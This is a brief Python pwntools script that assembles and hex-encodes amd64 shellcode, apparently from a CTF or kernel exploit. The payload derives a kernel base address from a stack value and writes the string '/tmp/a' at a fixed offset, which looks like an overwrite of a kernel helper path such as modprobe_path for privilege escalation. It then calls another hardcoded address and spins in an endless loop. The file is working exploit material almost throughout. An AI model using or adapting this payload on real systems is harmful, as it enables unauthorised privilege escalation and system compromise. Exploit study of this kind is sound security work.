from pwn import *

context.arch = 'amd64'

shellcode = '''
mov rax, [rsp+0x60]
sub rax, 0x20019e
lea rbx, [rax+0x1451220]
mov rcx, 0x612f706d742f
mov [rbx], rcx
ret

lea rbx, [rax+0xdc980]
mov rdi, 0x1000000
call rbx

sice:
jmp sice
'''

data = asm(shellcode)

encoded = ''

for c in data:
    encoded += '\\x' + c.encode('hex')

print(encoded)

print(map(ord, data))
